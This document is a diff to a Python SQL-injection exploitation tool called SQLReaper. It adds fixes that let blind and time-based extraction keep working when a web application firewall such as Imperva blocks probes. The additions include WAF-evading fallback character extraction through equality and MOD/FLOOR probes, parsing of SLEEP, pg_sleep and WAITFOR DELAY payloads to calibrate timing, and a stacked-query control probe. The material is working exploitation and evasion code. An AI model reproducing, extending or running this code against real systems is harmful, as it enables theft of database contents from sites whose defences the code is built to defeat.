@@ -1,15 +1,61 @@
 #!/usr/bin/env python3
 r"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
-║  SQLReaper v216 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 13, 2026)         ║
-║  v215 base + 1 additional bug fixed (timing oracle RC-2 detection in             ║
-║  _get_length_bitwise). v216 fixes the length-underestimation bug for strings    ║
-║  where the true length has bits 3 or 7 set (lengths 8-15, 24-31, 40-47, etc.)  ║
-║  when a timing oracle is used with Imperva WAF present.                          ║
+║  SQLReaper v216 — PRODUCTION ROOT-CAUSE INVESTIGATION (August 15, 2026)         ║
+║  v215 base + 5 additional bugs fixed. v216 fixes the timing-oracle RC-2 bug,   ║
+║  the S-technique path-injection FP probe-waste (all 5 DBMSes), the direct      ║
+║  extractor calibration WAF-block garbage (ÿÿÿ), and the r7 empty-string bug    ║
+║  caused by WAF selective blocking of char-comparison probes at real data pos.  ║
 ║                                                                                    ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
-║  FRESH EXAMINATION AUDIT (v215 → v216) — 2 BUGS FIXED                           ║
+║  FRESH EXAMINATION AUDIT (v215 → v216) — 5 BUGS FIXED                           ║
 ║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                    ║
+║  [✓] BUG-V216-S-EARLY-PATH-MANIP-REJECT: S-technique fires _safe_confirm + 5   ║
+║      additional multi/clean probes even when the detection probe returned non-  ║
+║      2xx non-WAF (URL path corrupted by ';') and no SQL error was in body.      ║
+║      Symptom: [S-confirm] fp2 sim=0.500 diff=0.500 err=False CONFIRMED on a    ║
+║      path-injection surface for ALL 5 major DBMSes (MySQL/PostgreSQL/MSSQL/    ║
+║      SQLite/Oracle/MariaDB). 6 probes wasted; S-clean finally rejects at       ║
+║      branch-3b (_s_det_is_path_err and not _s_cln_is_2xx) but too late.        ║
+║      Root cause: the path-routing failure is DBMS-agnostic (';' in URL → 404   ║
+║      regardless of SQL syntax), but no early check was done before entering    ║
+║      the 6-probe confirmation loop.                                              ║
+║      Fix: insert a single control probe ('$; -- -') BEFORE _safe_confirm.       ║
+║      If control probe also returns non-2xx non-WAF → path-manipulation FP,     ║
+║      return None immediately. Saves 5-6 probes per FP surface on all DBMSes.   ║
+║                                                                                    ║
+║  [✓] BUG-V216-DIRECT-CAL-WAF-BLOCKED: Direct extractor calibration produces   ║
+║      garbage (ÿÿÿ) when WAF blocks the TRUE-condition calibration probe.        ║
+║      Symptom: ms_t=338ms (WAF throttle, not SLEEP(1s)=1000ms), ms_f=64ms →    ║
+║      margin=274ms passes abs(margin)>=80ms check → _thresh=201ms. Binary        ║
+║      search probes (also WAF-blocked at ~338ms > 201ms) → oracle always True   ║
+║      → lo→255 → chr(255)='ÿÿÿ'; CRITICAL; _direct_extract; all 5 DBMSes.      ║
+║      Root cause: the abs(margin)>=80ms calibration pass check does not verify  ║
+║      ms_t against the expected SLEEP(N) duration, so WAF-throttle latency      ║
+║      (338ms) is mistaken for a valid (if noisy) timing signal.                  ║
+║      Fix 1: parse SLEEP(N)/pg_sleep(N)/WAITFOR DELAY argument from detection  ║
+║      payload; if ms_t < N*550ms (probe did not sleep ≥55% of expected delay)   ║
+║      → treat as low-margin and fall through to body-diff oracle fallback.       ║
+║      Fix 2: in _eval_d, add WAFBlockDiscriminator.is_waf_block() check before  ║
+║      timing comparison; WAF-blocked probes return None (oracle unknown).        ║
+║                                                                                    ║
+║  [✓] BUG-V216-EXTRACT-CONTRADICTORY-WAF-BLOCK: _extract_string produces ""    ║
+║      (empty) for r7 queries even after confirming _length>0 via slow method.   ║
+║      Symptom: timing oracle calibrated correctly (TRUE=10659ms, FALSE=320ms,   ║
+║      thresh=5489ms) for T-technique; WAF selectively blocks char comparison    ║
+║      probes (ORD(SUBSTRING(expr,pos,1))>=N) at real data positions but NOT     ║
+║      length probes (LENGTH(expr)>=N) → null-check at pos=1 returns fast →      ║
+║      ms < 5489ms → False → break immediately → result="" (zero chars);         ║
+║      CRITICAL; _extract_string; T/TH/BT techniques; all 5 DBMSes; Imperva.    ║
+║      Root cause: null-check False at pos=1 is treated as genuine end-of-string  ║
+║      even when _length>0 was confirmed by a different SQL oracle (LENGTH),     ║
+║      because _use_bitwise_fallback=False (gte operator worked for length).     ║
+║      Fix: when (not _use_bitwise_fallback AND not _boolean_oracle AND           ║
+║      _length>0 AND pos<=_length), null-check False is contradictory — attempt  ║
+║      _fallback_equality (= operator, not >=) then _fallback_modbit (MOD/FLOOR  ║
+║      only, no comparison operators). If char recovered → WAF-blocking at real  ║
+║      data positions confirmed; continue. Both fail → oracle dead, stop.        ║
 ║                                                                                    ║
 ║  [✓] BUG-V216-TIMING-ORACLE-RC2: _get_length_bitwise RC-2 cross-complementary  ║
 ║      sanity check fails for timing oracle. For boolean oracle: WAF blocking →   ║
@@ -63745,6 +63791,52 @@ class Scanner:
                 _null_cond = _op_char_tpl.replace("[QUERY]", query).replace("{pos}", str(pos)).replace("{mid}", _null_mid)
                 _has_char = await _cached_eval(_null_cond)
                 if _has_char is False:
+                    # BUG-V216-EXTRACT-CONTRADICTORY-WAF-BLOCK FIX (CRITICAL; MySQL/PostgreSQL/
+                    # MSSQL/SQLite/Oracle; T/TH/BT techniques with timing oracle):
+                    # Symptom: length oracle confirms _length>0 (e.g. slow method: LENGTH(q)>=N)
+                    # but the null-check at pos=1 immediately returns False → break → result="".
+                    # Root cause: WAF selectively blocks char-extraction comparison probes
+                    # (ORD(SUBSTRING(expr,pos,1)) >= N) at positions with real data, returning a
+                    # fast WAF-throttle response. With a timing oracle, fast → ms < thresh → False.
+                    # The LENGTH oracle uses a different SQL expression (LENGTH()/LEN()/CHAR_LENGTH())
+                    # which the WAF does NOT block, so _length>0 was correctly detected.
+                    # Contradiction: the string is non-empty (confirmed) but char at pos=1 is False.
+                    # Fix: when (a) not using bitwise fallback (comparison operators seemed to work
+                    # for length), (b) timing oracle is active (False can mean WAF-fast, not absent),
+                    # and (c) _length>0 and pos<=_length (string is confirmed non-empty at this pos):
+                    # — try WAF-safe _fallback_equality (= operator only) then _fallback_modbit
+                    #   (MOD/FLOOR/FLOOR-based bitwise, no comparison operators)
+                    # — if a char is recovered, WAF-blocking confirmed; continue extraction
+                    # — if both fail, oracle is dead at this position; stop normally
+                    if (not _use_bitwise_fallback and
+                            not _boolean_oracle and
+                            _length > 0 and
+                            pos <= _length):
+                        LOG.warning(
+                            "[Inference] %s: null-check False at pos=%d contradicts confirmed "
+                            "_length=%d — timing oracle WAF-blocked at real data position; "
+                            "attempting WAF-safe equality/modbit extraction",
+                            label, pos, _length)
+                        _waf_fb_ch = await _fallback_equality(query, pos)
+                        if _waf_fb_ch is None:
+                            _waf_fb_ch = await _fallback_modbit(query, pos)
+                        if _waf_fb_ch is not None:
+                            result += _waf_fb_ch
+                            if _char_extraction_start_t is None:
+                                _char_extraction_start_t = time.monotonic()
+                            _elapsed = time.monotonic() - _char_extraction_start_t
+                            _per_char = _elapsed / pos if pos > 0 else 0
+                            _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
+                            LOG.info(
+                                "[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, "
+                                "WAF-blocked-null-check fallback)",
+                                label, pos, _waf_fb_ch, result, _req_count, _remaining)
+                            _consecutive_fails = 0
+                            continue
+                        else:
+                            LOG.warning(
+                                "[Inference] %s: pos=%d WAF-safe fallbacks also failed "
+                                "— oracle dead at real data position, stopping", label, pos)
                     break  # End of string  no character here
                 if _has_char is None:
                     _consecutive_fails += 1
@@ -66787,6 +66879,20 @@ class Scanner:
         LOG.info("[Direct] Detection payload (decoded): %s", _payload[:60])
 
         _sleep_match = _re.search(r'(pg_sleep|SLEEP|sleep)\s*\([^)]+\)', _payload, _re.I)
+        # BUG-V216-DIRECT-CAL-WAF-BLOCKED (pre-extract): capture expected SLEEP duration
+        # from the detection payload for use in the calibration WAF-block check below.
+        # Covers pg_sleep(N), SLEEP(N), SLEEP(SQRT(N)) for MySQL/MariaDB/PostgreSQL.
+        # Also covers WAITFOR DELAY '0:0:N' for MSSQL/Sybase (Oracle uses dbms_lock.sleep).
+        _sleep_arg_m = _re.search(
+            r'(?:pg_sleep|SLEEP|sleep)\s*\(\s*(?:SQRT\s*\(\s*)?(\d+(?:\.\d+)?)',
+            _payload, _re.I)
+        _waitfor_arg_m = _re.search(
+            r"WAITFOR\s+DELAY\s+'0:0:(\d+(?:\.\d+)?)'", _payload, _re.I)
+        _cal_expected_sleep_ms = None
+        if _sleep_arg_m:
+            _cal_expected_sleep_ms = float(_sleep_arg_m.group(1)) * 1000.0
+        elif _waitfor_arg_m:
+            _cal_expected_sleep_ms = float(_waitfor_arg_m.group(1)) * 1000.0
         # BUG-DIRECT-HQ-SKIP FIX (CRITICAL, PostgreSQL/MySQL/MSSQL/Oracle, HQ technique,
         # all surfaces, all HTTP methods):
         # When detection is via HQ (Heavy Query / generate_series CTE), the payload
@@ -67083,7 +67189,26 @@ class Scanner:
             _d_oracle_inverted = True
             LOG.info("[Direct] Inverted timing oracle detected (margin=%.0fms): "
                      "TRUE→fast, FALSE→slow — activating polarity inversion", _margin)
-        if abs(_margin) < 80:
+
+        # BUG-V216-DIRECT-CAL-WAF-BLOCKED FIX (CRITICAL, MySQL/PostgreSQL/MSSQL/SQLite/Oracle):
+        # When the WAF blocks the TRUE-condition calibration probe, ms_t returns WAF-throttle
+        # latency (~338ms) instead of the expected SLEEP(N)*1000ms. This produces a margin
+        # like 274ms (338ms − 64ms) that passes abs(margin) >= 80ms, setting _thresh=201ms.
+        # All subsequent binary-search probes are also WAF-blocked at ~338ms > 201ms →
+        # oracle always True → lo converges to 255 → chr(255)='ÿÿÿ' garbage result.
+        # Fix: when the expected SLEEP duration is known and ms_t < 55% of expected_ms,
+        # the TRUE probe clearly did not sleep (WAF-blocked). Force the body-oracle branch.
+        _cal_true_waf_blocked = (
+            _cal_expected_sleep_ms is not None and
+            _cal_expected_sleep_ms > 0 and
+            ms_t < _cal_expected_sleep_ms * 0.55
+        )
+        if _cal_true_waf_blocked:
+            LOG.info(
+                "[Direct] TRUE calibration probe WAF-blocked: ms_t=%.0fms < %.0fms "
+                "(55%% of expected SLEEP=%.0fms) — forcing body-oracle fallback",
+                ms_t, _cal_expected_sleep_ms * 0.55, _cal_expected_sleep_ms)
+        if abs(_margin) < 80 or _cal_true_waf_blocked:
             # Require body gap to be meaningful relative to page size.
             # 50B absolute was far too low: dynamic pages show ±200-500B variation per-request
             # (timestamps, session tokens, counters). Require ≥1% of page size AND ≥200B
@@ -67126,6 +67251,16 @@ class Scanner:
                 await asyncio.sleep(_delay)
                 fp, ms = await _send_d_timed(p)
             if fp is None or ms < 30:
+                return None
+            # BUG-V216-DIRECT-EVAL-WAF-BLOCK FIX (CRITICAL, all 5 DBMSes):
+            # WAF-blocked binary-search probes return WAF-throttle latency (~338ms)
+            # independent of the SQL condition. If _thresh was correctly calibrated
+            # (e.g. 201ms from a WAF-blocked calibration we couldn't detect before),
+            # all such probes exceed _thresh → oracle always True → lo→255 → chr(255)='ÿ'.
+            # Fix: when WAFBlockDiscriminator identifies this response as a WAF block,
+            # return None (oracle unknown) so the caller handles it as an inconclusive
+            # result instead of silently biasing the oracle towards True.
+            if fp is not None and WAFBlockDiscriminator.is_waf_block(fp):
                 return None
             # BUG-CAL-INVERTED-POLARITY FIX: flip result for inverted-oracle detection templates.
             _raw = ms >= _thresh
@@ -125839,6 +125974,52 @@ class TechniqueCascadeEngine:
                 if (has_err or _s_diff > 0.25) and not _s_waf:
                     # Confirmation: re-send the same payload  consistent diff = real
                     if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-S-CONFIRM
+                    # BUG-V216-S-EARLY-PATH-MANIP-REJECT: When detection probe
+                    # returned non-2xx non-WAF (e.g. 404 from ';' corrupting URL path)
+                    # and there was no SQL error, send ONE minimal control probe with
+                    # just '; -- -' (no SQL keyword) BEFORE the expensive 6-probe
+                    # confirmation+multi+clean loop. Path-routing failures are
+                    # DBMS-agnostic: the same 404 fires for MySQL, PostgreSQL, MSSQL,
+                    # SQLite, Oracle, and MariaDB. Saves 5-6 probes per FP surface.
+                    _s_det_sc = getattr(fp, 'status_code', None)
+                    _s_early_path_err = (
+                        _s_det_sc is not None and
+                        not (200 <= _s_det_sc < 300) and
+                        not _s_waf and
+                        not has_err and
+                        ';' in (payload or '')
+                    )
+                    if _s_early_path_err:
+                        await asyncio.sleep(0.1)
+                        if _SCAN_STOPPED[0]: return None
+                        _s_ctrl_pay = original + "'; -- -"
+                        _s_ctrl_fp = await self._safe_confirm(
+                            method, url, data, data_fmt, param,
+                            _s_ctrl_pay, self.tamper_chain)
+                        if _s_ctrl_fp:
+                            self._total_reqs += 1
+                            _s_ctrl_sc = getattr(_s_ctrl_fp, 'status_code', None)
+                            _s_ctrl_waf = WAFBlockDiscriminator.is_waf_block(_s_ctrl_fp)
+                            _s_ctrl_path_manip = (
+                                _s_ctrl_sc is not None and
+                                not (200 <= _s_ctrl_sc < 300) and
+                                not _s_ctrl_waf
+                            )
+                            if _s_ctrl_path_manip:
+                                print(
+                                    f"    [S-early] [{dbms}] req#{self._total_reqs} "
+                                    f"EARLY PATH-MANIP REJECT: ctrl ';' → {_s_ctrl_sc} "
+                                    f"(non-2xx non-WAF, same as detection {_s_det_sc}) "
+                                    f"→ path-corruption FP rejected before confirm loop "
+                                    f"(MySQL/PostgreSQL/MSSQL/SQLite/Oracle/MariaDB)"
+                                )
+                                return None
+                            else:
+                                print(
+                                    f"    [S-early] [{dbms}] req#{self._total_reqs} "
+                                    f"ctrl ';' → {_s_ctrl_sc} (not path-manip) "
+                                    f"→ proceeding with full confirmation"
+                                )
                     await asyncio.sleep(0.1)  # BUG-SLEEP-REDUCE FIX: 1.0s→0.1s (fast stop post-confirm)
                     if _SCAN_STOPPED[0]: return None  # BUG-FIX-REQ4-S-CONFIRM
                     _fp_c = await self._safe_confirm(method, url, data,
